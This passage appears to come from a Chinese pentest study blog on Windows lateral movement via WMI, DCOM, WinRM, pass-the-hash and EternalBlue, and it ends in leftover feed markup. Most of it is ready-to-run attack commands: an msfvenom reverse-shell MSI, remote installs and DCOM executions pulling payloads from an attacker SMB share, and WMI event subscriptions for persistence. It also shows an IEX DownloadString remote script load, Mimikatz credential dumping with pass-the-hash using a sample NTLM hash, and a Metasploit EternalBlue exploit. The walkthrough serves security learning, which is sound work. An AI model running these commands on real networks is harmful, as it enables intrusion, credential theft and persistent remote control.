Product类中的Install方法可以在远程主机上安装恶意的MSI<strong>二是远程部署WMI事件订阅，在特定条的事件发生时触发攻击。</strong></p><p>利用WMI横向移动需要两个条件：</p><ol><li>远程主机的WMI服务为开启状态(默认开启)</li><li>远程主机防火墙放行135端口，这是WMI默认的管理端口</li></ol><h2><span id="常规利用方法">常规利用方法</span></h2><p>在 Windows 上可以通过wmic.exe和PowerShell Cmdlet来使用 WMI数据和执行 WMI方法。</p><p>Windows PowerShell 也提供了许多可以与 WMI进行交互的Cmdlet，如Invoke-WmiMethod、Set-Wmilnstance 等。</p><p><strong>执行远程查询</strong></p><p>查询远程主机进程信息</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic /node:10.10.10.19 /user:Administrator /password:Admin@123 process list brief<br></code></pre></td></tr></table></figure><p><strong>创建远程进程</strong></p><p>通过调用 Win32_Process.Create方法在远程主机上创建进程,启动CMD 来执行系统命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic /node:10.10.10.19 /user:Administrator /password:Admin@123 process call create<br>&quot;cmd.exe /c ipconfig &gt; C\:result.txt&quot;<br></code></pre></td></tr></table></figure><p>由于 WMIC 在执行命令时没有回显，因此可以将执行结果写入文件，然后通过建立共享连接等方式使用 type 命令远程读取。</p><p><strong>远程安装MSI文件</strong></p><p>通过调用 Win32 Product.Install 方法，可以控制远程主机安装恶意的 MSI(MicrosoftInstaller)文件，从而获取其权限。</p><ol><li><p>使用Metasploit生成一个恶意的MSI文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.2.143 LPORT=4444 -f ms -o reverse tcp.msi<br></code></pre></td></tr></table></figure></li><li><p>在一台测试人员可控的服务器上搭建 SMB 共享服务器，并将生成的 MSI文件放入共享目录。</p></li><li><p>在跳板机上执行以下命令：</p><p>控制远程主机，通过UNC路径进行远程加载测试人员服务器的 MSI 文件并进行安装，成功获取远程主机的权限.</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic /node:10.10,10.19 /user:Administrator /password:Admin@123 product call install<br>PackageLocation=&quot;\\192.168.2.143\evilsmb\reverse_tcp.msi&quot;<br></code></pre></td></tr></table></figure></li></ol><h2><span id="常见利用工具">常见利用工具</span></h2><p><strong>Wmiexec</strong></p><p>Impacket 项目的 wmiexec.py能够以全交互或半交互的方式，通过 WMI 在远程主机上执行命令。注意，该工具需要远程主机开启 135 和 445 端口，其中 445 端口用于传输命令执行的回显。</p><p>执行下面命令，获取远程主机的交互式命令行：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python wmiexec.py HACK-MY/Administrator:Admin\@123@10.10.10.19<br><span class="hljs-meta prompt_"># </span><span class="language-bash">python wmiexec.py &lt;Domian&gt;/&lt;Username&gt;:&lt;Password&gt;@&lt;IP&gt;</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448983.png" alt="image-20240415090722425"></p><p>Windows平台可以使用PyInstaller，将wmiexec.py打包成独立的可执行文件exe，打包完成后可以直接上传到Windows主机中运行</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">pip3 install pyinstaller<br>cd impacket\examples<br>pyinstaller -F wmiexec.py<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448984.png" alt="image-20240415091103406"></p><p><strong>Invoke-WmiCommand</strong></p><p>Invoke-WmiCommand.ps1是PowerSploit 项目中的一个脚本，可以通过 PowerShell调用WMI来远程执行命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">远程加载Invoke—WmiCommand.ps1脚本</span><br>IEX(New-Object Net.Webclient).DownloadString(&#x27;http://IP:Port/Invoke-WmiCommand.ps1&#x27;)<br><span class="hljs-meta prompt_"># </span><span class="language-bash">指定远程系统用户名</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">User = <span class="hljs-string">&quot;HACK-MY\Administrator&quot;</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">指定用户的密码</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">Password = ConvertTo-SecureString -String <span class="hljs-string">&quot;Admin@123&quot;</span> -AsPlainText -Force</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">将用户名和密码整合，以便导入Credential</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">Cred = New-Object-TypeName System.Mangement.Automation.PSCredential -ArgumentList <span class="hljs-variable">$User</span>,<span class="hljs-variable">$Password</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">指定远程主机的IP和要执行的命令</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">Remote = Invoke-WmiCommand -Payload (ipconfig) -Credential <span class="hljs-variable">$Cred</span> -ComputerName <span class="hljs-string">&quot;10.10.10.19&quot;</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">输出命令执行回显</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">Remote.PayloadOutput</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448985.png" alt="image-20240415092051471"></p><p>此外，PowerShell内置的Invoke-WMIMethod也可以在远程系统中执行命令或程序。</p><h2><span id="wmi事件订阅的利用">WMI事件订阅的利用</span></h2><p>WMI提供了强大的事件处理系统，几乎可以用于对操作系统上发生的任何事件做出响应。例如，当创建某进程时，通过WMI事件订阅来执行预先设置的脚本。其中，触发事件的具体条件被称为“事件过滤器”(Event Filter)，如用户登录、新进程创建等;对指定事件发生做出的响应被称为“事件消费者”(Event Consumer)，包括一系列具体的操作，如运行脚本、记录日志、发送邮件等。在部署事件订阅时，需要分别构建 Filter和 Consumer 两部分，并将二者绑定在一起。</p><p>所有的事件过滤器都被存储为一个 ROOT\subscription:__EventFilter 对象的实例，可以通过创建EventFilter 对象实例来部署事件过滤器。事件消费者是基于 ROOTsubscription:__EventConsumer 系统类派生来的类。系统提供了常用的标准事件消费类。</p><table><thead><tr><th>事件消费类</th><th>说明</th></tr></thead><tbody><tr><td>LogFileEventConsumer</td><td>将事件数据写入指定的日志文件</td></tr><tr><td>ActiveScriptEventConsumer</td><td>执行嵌入的VBScript或JavaScript脚本</td></tr><tr><td>NTEventLogEventConsumer</td><td>创建一个包含事件数据的事件日志条目</td></tr><tr><td>SMTPEventConsumer</td><td>发送一封包含事件数据的电子邮件</td></tr><tr><td>CommandLineEventConsumer</td><td>执行指定的系统命令</td></tr></tbody></table><p>测试人员可以利用WMI在远程主机部署永久的事件订阅，在特定事件发生时执行任意代码或者命令。该技术主要用来在目标系统完成权限持久化，亦可用于横向移动，并且需要提供远程主机的管理员权限的用户凭据。</p><p><strong>手动利用</strong></p><p>通过手动执行PowerShell命令来进行利用</p><ol><li><p>整合PSCredential，用于后续过程的认证</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">Username =<span class="hljs-string">&quot;HACK-MY\Administrator&quot;</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">Password =<span class="hljs-string">&quot;Admin@123&quot;</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">SecurePassword = <span class="hljs-variable">$Password</span> | ConvertTo-SecureString -AsPlainText -Force</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">Credential = New-0bject -TypeName System.Management.Automation.PSCredential -ArgumentList <span class="hljs-variable">$Username</span>,<span class="hljs-variable">$SecurePassword</span></span><br></code></pre></td></tr></table></figure></li><li><p>设置攻击目标和其他公共参数</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">GlobalArgs = @&#123;&#125;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">SComputerName = <span class="hljs-string">&quot;10.10.10.19&quot;</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">GlobalArgs[<span class="hljs-string">&#x27;Credential&#x27;</span>] = <span class="hljs-variable">$Credential</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">GlobalArgs[<span class="hljs-string">&#x27;ComputerName&#x27;</span>]=<span class="hljs-variable">$ComputerName</span></span><br></code></pre></td></tr></table></figure></li><li><p>在远程主机部署”TestFilter”事件过滤器，用于查询svchost.exe进程的产生。通过Set-WmiInstance Cmdlet创建一个__EventFilter类的实例即可</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">EventFilterArgs = @&#123;</span><br>    EventNamespace =&quot;root/cimv2<br>    Name =&quot;TestFiltern<br>    Query = &quot;SELECT * FROM Win32_ProcessStartTrace where processname =&#x27;svchost.exe&#x27;&quot;<br>    QueryLanguage =&#x27;WQL&#x27;<br>&#125;<br><span class="hljs-meta prompt_">$</span><span class="language-bash">EventFilter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments <span class="hljs-variable">$EventFilterArgs</span> @GlobalArgs</span><br></code></pre></td></tr></table></figure></li><li><p>在远程主机上部署一个名为”TestConsumer”的事件消费者</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">CommandLineEventConsumerArgs = @&#123;</span><br>    Name = &quot;TestConsumer&quot;<br>    CommandLineTemplate = &quot;C:\Windows\System32\cmd.exe /c calc.exe&quot;<br>&#125;<br><span class="hljs-meta prompt_">$</span><span class="language-bash">EventConsumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments <span class="hljs-variable">$CommandLineEventConsumerArgs</span> @GlobalArgs</span><br></code></pre></td></tr></table></figure></li><li><p>将创建的事件过滤器和时间消费者绑定在一起</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">FilterConsumerBindingArgs = @&#123;</span><br>    Filter = $EventFilter<br>    Consumer = $EventConsumer<br>&#125;<br><span class="hljs-meta prompt_">$</span><span class="language-bash">FilterConsumerBinding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments <span class="hljs-variable">$FilterConsumerBindingArgs</span> @GlobalArgs</span><br></code></pre></td></tr></table></figure></li></ol><p>到此，已经成功在远程主机(10.10.10.19)上部署了一个事件订阅，当远程系统轮询到 svchost.exe进程产生时，将通过事件消费者执行系统命令来启动calc.exe进程。</p><p><img src="http://cdn.clown2024.cn/202407151448986.png" alt="image-20240415094422693"></p><p><strong>Sharp-WMIEvent</strong></p><p>上面的利用过程可以整合为一个powershell脚本。不过相关脚本项目网上好像没了。</p><ol><li><p>在可控的服务器上搭建SMB共享服务器，并将生成的攻击载荷放入共享目录</p></li><li><p>在跳板机上执行下面命令，运行该脚本：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Sharp-WMIEvent -Trigger Interval -IntervalPeriod 60 -ComputerName 10.10.10.19 -Domain hack-my.com -Username Administrator -Password Admin@123 -Command &quot;cmd.exe /c \\10.10.10.147\evilsmb\reverse_tcp.exe&quot;<br></code></pre></td></tr></table></figure></li></ol><p>然后就将在远程主机上部署一个随机命名的永久事件订阅，并隔60秒会执行一次SMB共享中的攻击载荷，上线远程主机</p><p><img src="http://cdn.clown2024.cn/202407151448987.png" alt="image-20240415165851113"></p><p><img src="http://cdn.clown2024.cn/202407151448988.png" alt="image-20240415165904903"></p><h1><span id="dcom的利用">DCOM的利用</span></h1><h2><span id="com和dcom">COM和DCOM</span></h2><p><strong>COM</strong></p><p>COM(Component Object Model，组件对象模型)是微软的一套软件组件的二进制接口标准，使得跨编程语言的进程间通信、动态对象创建成为可能。COM是多项微软技术与框架的基础，包括 OLE、OLE自动化、ActiveX、COM+、DCOM、Windows Shell、DirectX、Windows Runtime。</p><p>COM 由一组构造规范和组件对象库组成。COM组件对象通过接口来描述自身，组件提供的所有服务都通过其接口公开。接口被定义为“在对象上实现的一组语义上相关的功能”，实质是一组函数指针表。每个指针必须初始化指向某个具体的函数体，一个组件对象实现的接口数量没有限制。COM指定了一个对象模型和编程要求，使COM对象能够与其他对象交互。这些对象可以在单个进程中，也可以在其他进程中，甚至可以在远程计算机上。</p><p>在 Windows中，每个COM 对象都由唯一的128 位的二进制标识符标识，即 GUID当 GUID用于标识 COM 对象时，被称为CLSID(类标识符)；当它用于标识接口时，被称为IID(接口标识符)。一些CLSID还具有ProgID，方便人们记忆。</p><p><strong>DCOM</strong></p><p>DCOM(Distributed Component Object Model，分布式组件对象模型)是微软基于组件对象模型(COM)的一系列概念和程序接口，支持不同机器上的组件间的通信。利用DCOM，客户端程序对象能够请求来自网络中另一台计算机上的服务器程序对象。</p><p>DCOM是COM的扩展,允许应用程序实例化和访问远程计算机上的COM对象的属性和方法。DCOM使用远程过程调用(RPC)技术将组件对象模型(COM)的功能扩展到本地计算机之外,因此,在远程系统上托管COM服务器端的软件(通常在 DLL 或EXE中)可以通过RPC向客户端公开其方法。</p><h2><span id="通过dcom横向移动">通过DCOM横向移动</span></h2><p>部分DCOM组件中公开的接口中可能包含不安全的方法。</p><p>执行下面命令可以查看所有DCOM程序组件：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Get-CimInstance Win32_DCOMApplication<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448989.png" alt="image-20240415235944954"></p><p>测试人员可以枚举包含不安全方法的DCOM对象，并于远程计算机的DCOM对象进行交互，从而实现远程执行。不过需要满足下面的条件：拥有管理员权限的PowerShell；远程主机未开启防火墙。</p><p>目前常用的组件有：MMC20.Application、ShellWindows、Excel.Application、ShellBrowserWindow等。</p><p><strong>MMC20.Application</strong></p><p>MMC20.Application对象的Document.ActiveView下存在一个ExecuteShellCommand方法，可以用来启动子进程并运行执行的程序或系统命令</p><p>下面利用该组件上线Meterpreter</p><ol><li><p>在一台服务器搭建SMB匿名共享服务，将攻击载荷放在共享目录下面</p></li><li><p>在管理员权限的PowerShell执行下面命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">通过 ProgID 与 DCOM 进行远程交互，并创建 MMC20.Application 对象的实例</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">com = [activator]::CreateInstance([<span class="hljs-built_in">type</span>]::GetTypeFromProgID(<span class="hljs-string">&quot;MMC20.Application&quot;</span>,<span class="hljs-string">&quot;10.10.10.19&quot;</span>))</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">调用ExecuteShellCommand方法启动进程，以运行攻击载荷</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">com.Document.ActiveView.ExecuteShellCommand(<span class="hljs-string">&#x27;cmd.exe&#x27;</span>,<span class="hljs-variable">$null</span>,<span class="hljs-string">&quot;/c \\192.168.2.143\evilsmb\reverse_tcp.exe&quot;</span>,<span class="hljs-string">&quot;Minimized&quot;</span>)</span><br></code></pre></td></tr></table></figure></li></ol><p><img src="http://cdn.clown2024.cn/202407151448990.png" alt="image-20240416002841235"></p><p>在调用过程中,MMC20.Application会启动mmc.exe进程,通过ExecuteShellCommand方法在 mmc.exe 中创建子进程，适用于 Windows7及以上版本的系统,</p><p><strong>ShellWindows</strong></p><p>ShellWindows 组件提供了 Document.Application.ShellExecute 方法，可以启动子进程来运行指定的程序或系统命令，适用于Windows7及以上版本的系统。</p><p><img src="http://cdn.clown2024.cn/202407151448991.png" alt="image-20240416003019343"></p><p>因为该对象没有ProgID，所以需要CLSID来创建实例。</p><p>可以用下面命令来查找：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Get-CimInstance Win32_DCOMApplication | findstr ShellWindows<br></code></pre></td></tr></table></figure><p>还可以通过OleViewDotNet来查找，OleViewDotNet 是一个独立的工具，需要安装并在 Windows 操作系统上运行。</p><p><img src="http://cdn.clown2024.cn/202407151448992.png" alt="image-20240416003638763"></p><p>跟上面的利用方法类似，在管理员权限PowerShell下执行下面命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">通过CLSID与DCOM进行远程交互，并创建ShellWindows对象实例</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">com = [activator]::CreateInstance([<span class="hljs-built_in">type</span>]::GetTypeFromCLSID(<span class="hljs-string">&quot;9BA05972-F6A8-11CF-A442-00A0C90A8F39&quot;</span>,<span class="hljs-string">&quot;10.10.10.19&quot;</span>))</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">调用ShellExecute方法启动子进程</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">com.item().Document.Application.ShellExecute(<span class="hljs-string">&quot;cmd.exe&quot;</span>,<span class="hljs-string">&quot;/c calc.exe&quot;</span>,<span class="hljs-string">&quot;C:\Windows\System32&quot;</span>,<span class="hljs-variable">$null</span>,0)</span><br></code></pre></td></tr></table></figure><p>注意，ShellWindows并不会创建新进程，而是在已有 explorer.exe进程中创建并执行子进程。</p><p><img src="http://cdn.clown2024.cn/202407151448993.png" alt="image-20240416004155840"></p><p><strong>ShellBrowserWindow</strong></p><p>ShellBrowserWindow中也存在一个Document.Application.ShellExecute方法，与ShellWindows 一样，但不会创建新进程，而是通过已有的 explorer.exe 来托管子进程。该方法只适用于 Windows 10和 Windows Server 2012等版本的系统</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">通过CLSID与DCOM进行远程交互，并创建ShellBrowserWindow对象实例</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">com = [activator]::CreateInstance([<span class="hljs-built_in">type</span>]::GetTypeFromCLSID(<span class="hljs-string">&quot;c08afd90-f2a1-11d1-8455-00a0c91f3880&quot;</span>,<span class="hljs-string">&quot;10.10.10.19&quot;</span>))</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">调用ShellExecute方法启动子进程</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">com.item().Document.Application.ShellExecute(<span class="hljs-string">&quot;cmd.exe&quot;</span>,<span class="hljs-string">&quot;/c calc.exe&quot;</span>,<span class="hljs-string">&quot;C:\Windows\System32&quot;</span>,<span class="hljs-variable">$null</span>,0)</span><br></code></pre></td></tr></table></figure><h1><span id="winrm的利用">WinRM的利用</span></h1><p>WinRM 是通过执行 WS-Management 协议(用于远程软件和硬件管理的 Web 服务协议)来实现远程管理的，允许处于一个共同网络内的 Windows 计算机彼此之间互相访问和交换信息，对应的端口是 5985。在一台计算机启用 WinRM 服务后，防火墙会自动放行其相关通信端口，另一台计算机便能通过 WinRM 对其进行远程管理了。</p><p>注意，只有在Windows Server 2008以上版本的服务器中WinRM 服务才会自动居动。测试人员通过 WinRM 服务进行横向移动时，需要拥有远程主机的管理员凭据信息。</p><h2><span id="通过winrm执行远程命令">通过WinRM执行远程命令</span></h2><p><strong>Winrs</strong></p><p>Winrs是一个客户端程序，通过用户凭据在运行WinRM的服务器上执行系统命令，双方都需要安装WinRM。</p><p>执行下面命令在远程主机执行上执行命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">winrs -r:http://10.10.10.19:5985 -u:Administrator -p:Admin@123 &quot;whoami&quot;<br></code></pre></td></tr></table></figure><p>还可以获得交互式命令行</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">winrs -r:http://10.10.10.19:5985 -u:Administrator -p:Admin@123 &quot;cmd&quot;<br></code></pre></td></tr></table></figure><p><strong>Winrm.cmd</strong></p><p>Winrm.cmd 允许 WMI对象通过 WinRM 传输进行远程交互，在本地或远程计算机上枚举 WMI 对象实例或调用 WMI 类方法。例如，通过调用 Win32_Process 类中的 Create方法来创建远程进程。</p><p>实战中可以远程执行一个攻击载荷，这里尝试启动一个notepad.exe进程：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">winrm invoke create wmicimv2/win32_process -SkipCAcheck -skipCNcheck @&#123;commandline=&quot;notepad.exe&quot;&#125; -r:http://10.10.10.19:5985 -u:Administrator -p:Admin@123<br></code></pre></td></tr></table></figure><p>查看远程主机的进程，可以看到正在运行</p><p><img src="http://cdn.clown2024.cn/202407151448994.png" alt="image-20240416005418907"></p><h2><span id="通过winrm获取交互式会话">通过WinRm获取交互式会话</span></h2><p><strong>PowerShell下的利用</strong></p><p>PowerShell 的远程传输协议基于WinRM规范，同时提供了强大的远程管理功能。</p><p>Enter-PSSession的PowerShellCmdlet可以启动与远程主机的会话。在会话交互期间用户输入的命令在远程计算机上运行，就像直接在远程计算机上输入一样。</p><ol><li><p>跳板机上执行以下命令启动一个与远程主机的交互式会话，其名称为WinRM1</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">指定远程系统用户名</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">User = <span class="hljs-string">&quot;HACK-MY\Administrator&quot;</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">指定用户的密码</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">Password = ConvertTo-SecureString -String <span class="hljs-string">&quot;Admin@123&quot;</span> -AsPlainText -Force</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">将用户名和密码整合，以便导入Credential</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">Cred = New-0bject -TypeName System.Management.Automation.PSCredential -ArgumentList <span class="hljs-variable">$User</span>,<span class="hljs-variable">$Password</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">根据提供的凭据创建会话</span><br>New-PSSession -Name WinRM1 -ComputerName 10.10.10.19 -Credential $cred -Port 5985<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448995.png" alt="image-20240416092847951"></p></li><li><p>执行<strong>Get-PSSession</strong>查看当前已创建的PSSession会话</p><p><img src="http://cdn.clown2024.cn/202407151448996.png" alt="image-20240416093011945"></p></li><li><p>执行下面命令，选中任意一个会话，进入交互模式</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Enter-PSSession -Name WinRM1<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448997.png" alt="image-20240416093130574"></p></li><li><p>也可以通过Invoke-Command在指定的会话中执行下面命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">指定远程系统用户名</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">User =<span class="hljs-string">&quot;HACK-MY\Administrator&quot;</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">指定用户的密码</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">Password =ConvertTo-SecureString -String <span class="hljs-string">&quot;Admin@123&quot;</span> -AsPlainText -Force</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">将用户名和密码整合，以便导入Credential</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">Cred = New-0bject -TypeName System.Management.Automation.PsCredential -ArgumentList <span class="hljs-variable">$User</span>,<span class="hljs-variable">$Password</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">根据提供的凭据创建会话</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">Sess=New-PSSession -Name WinRMl -ComputerName 10,10,10.19 -Credential <span class="hljs-variable">$Cred</span> -Port 5985</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">在创建的会话中执行命令</span><br>Invoke-Command -Session $Sess -ScriptBlock&#123;dir c:\&#125;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448998.png" alt="image-20240416093424298"></p></li></ol><p><strong>Evil-Winrm</strong></p><p>Evil-Winrm 是基于 WinRM Shell 的渗透框架，可通过提供的用户名密码或用户哈希值在启用了 WinRM 服务的目标主机上完成简单的攻击任务。</p><h1><span id="哈希传递攻击">哈希传递攻击</span></h1><p>哈希传递(Pass The Hash，PTH)是一种针对NTLM协议的攻击技术。在NTLM 身份认证的第三步中生成Response 时，客户端直接使用用户的NTLM 哈希值进行计算，用户的明文密码并不参与整个认证过程。也就是说，在Windows 系统中只使用用户哈希值对访问资源的用户进行身份认证。</p><p>因此当获得有效的用户名和哈希之后，就能够利用该信息对远程主机进行身份验证。</p><h2><span id="哈希传递攻击的利用">哈希传递攻击的利用</span></h2><p>下面用Mimikatz和Impacket进行哈希传递工具，相关工具还有很多，如CrackMapExec、PowerShell、Evil-Winrm等，Metasploit框架下也内置了很多可以执行哈希传递攻击的模块。</p><p><strong>Mimikatz利用</strong></p><p>MImikatz内置了哈希传递功能，需要管理员权限。</p><ol><li><p>Mimikatz上传到跳板机后执行下面命令抓取域管理员哈希</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448999.png" alt="image-20240416094725309"></p></li><li><p>利用抓取到的NTLM Hash进行哈希传递攻击</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:Administrator /domain:hack-my.com /ntlm:570a9a65db8fba761c1008a51d4c95ab&quot; exit<br><span class="hljs-meta prompt_"># </span><span class="language-bash">/user，指定要传递的用户名;/domain，指定当前所处域名或工作组名;/ntlm，指定用户哈希</span><br></code></pre></td></tr></table></figure><p>弹出一个新的命令行窗口，在新的命令行中具有域管理员权限，可以访问域控的CIFS服务。</p><p><img src="http://cdn.clown2024.cn/202407151448000.png" alt="image-20240416094714274"></p></li></ol><p><strong>利用Impacket进行PTH</strong></p><p>该项目中具有远程执行功能的几个脚本几乎都可以进行哈希传递攻击，常见的有psexec.py、smbexec.py和wmiexec.py。使用时可以配合内网代理技术进行攻击。</p><p>例如smbexec.py：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python smbexec.py -hashes :570a9a65db8fba761c1008a51d4c95ab hack-my.com/administrator@10.10.10.19<br><span class="hljs-meta prompt_"># </span><span class="language-bash">python smbexec.py -hashes LM Hash:NLTM Hash domain/username@ip</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">-hashes，指定用户完整的哈希值，如果 LM Hash被废弃，就将其指定为0或为空</span><br></code></pre></td></tr></table></figure><h2><span id="利用哈希传递登录远程桌面">利用哈希传递登录远程桌面</span></h2><p>利用条件：</p><ol><li>远程主机开启了”受限管理员模式”</li><li>用于远程登陆的用户位于远程主机的管理员组中</li><li>目标用户的哈希</li></ol><p>Windows Server 2012 R2及以上版本的 Windows 系统采用了新版的RDP，支持受限管理员模式(Restricted Admin Mode)。开启该模式后，测试人员可以通过哈希传递直接登录远程桌面，不需输入明文密码。受限管理员模式在 Windows 8.1和 Windows Server2012R2上默认开启，在其他主机中可以通过执行以下命令手动开启。</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg add &quot;HKLM\System\CurrentControlset\Control\Lsa&quot; /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f<br></code></pre></td></tr></table></figure><ol><li><p>查看主机是否开启”受限管理员模式”，为0则开启，否则未开启</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg query &quot;HKLM\System\CurrentControlset\Control\Lsa&quot; /v DisableRestrictedAdmin<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448001.png" alt="image-20240416180945907"></p></li><li><p>若开启，则通过Mimikatz进行利用</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">privilege::debug<br>sekurlsa::pth /user:Administrator /domain:hack-my.com /ntlm:570a9a65db8fba761c1008a51d4c95ab &quot;/run:mstsc.exe /restrictedadmin&quot;<br></code></pre></td></tr></table></figure><p>大致原理是，哈希传递成功后执行“mstsc.exe &#x2F;restrictedadmin”命令，以受限管理员模式运行远程桌面客户端，此时不需输入用户名密码即可成功登录远程桌面</p></li></ol><h1><span id="eternalblue">EternalBlue</span></h1><p>即大名鼎鼎的永恒之蓝漏洞。</p><p>Metasploit 渗透框架内置了 EternalBlue 漏洞的检测和利用模块。下面通过 Windows’环境进行漏洞利用。</p><ol><li><p>通过auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010模块扫描目标主机是否存在漏洞</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">use auxiliary/scanner/smb/smb_ms17_010<br>set rhosts 10.10.10.14  # 设置目标主机的IP，也可以设置整个IP段<br>set threads 10<br>exploit<br></code></pre></td></tr></table></figure></li><li><p>通过exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue模块进行漏洞利用</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">use exploit/windows/smb/ms17_010_eternalblue<br>set rhosts 10.10.10.14<br>set payload windows/x64/meterpreter/reverse_tcp<br>set lhost 10.10.10.147<br>set lport 4444<br>exploit<br></code></pre></td></tr></table></figure></li></ol><p>Metasploit中还有很多远程代码执行漏洞相关的漏洞。</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSSQL学习</title>
      <link href="/2024/04/03/MSSQL%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/04/03/MSSQL%E5%AD%A6%E4%B9%A0/</url>
      
